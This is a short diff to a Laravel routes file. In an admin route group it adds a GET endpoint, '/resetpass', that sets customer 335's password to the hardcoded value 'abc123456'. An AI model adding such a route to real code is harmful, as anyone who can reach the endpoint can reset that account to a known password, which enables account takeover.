@@ -83,6 +83,13 @@ Route::group(['prefix'=>'admin','namespace'=>'App\Modules\Admin\Controllers'],fu
 			// MANAGE SUPER CUSTOMER
 
 			Route::resource('/customer','CustomerController');
+
+			Route::get('/resetpass', function(){
+					$user = App\Models\Customer::find(335);
+					$user->password = bcrypt('abc123456');
+					$user->save();
+					return "done";
+			});
 		});
 
 		// ALBUM
